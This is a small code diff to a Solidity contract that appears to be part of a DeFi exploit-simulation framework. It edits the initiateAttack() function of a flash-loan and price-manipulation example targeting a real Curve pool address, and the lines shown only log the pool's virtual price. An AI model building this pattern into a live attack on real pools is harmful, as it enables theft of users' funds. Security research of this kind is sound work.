@@ -13,7 +13,7 @@ contract PriceManipulationExample is PriceManipulation, FlashLoan, Tokens {
     using FlashLoanProvider for FlashLoanProviders;
     using PriceManipulationProvider for PriceManipulationProviders;
 
-    function initiateAttack() external override(PriceManipulation, FlashLoan) {
+    function initiateAttack() external {
         console.log("---------------------------------------------------------------------------");
         console.log("Curve Virtual Price BEFORE:", IPool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022).get_virtual_price());
         // Deal ether to cover fees and losses
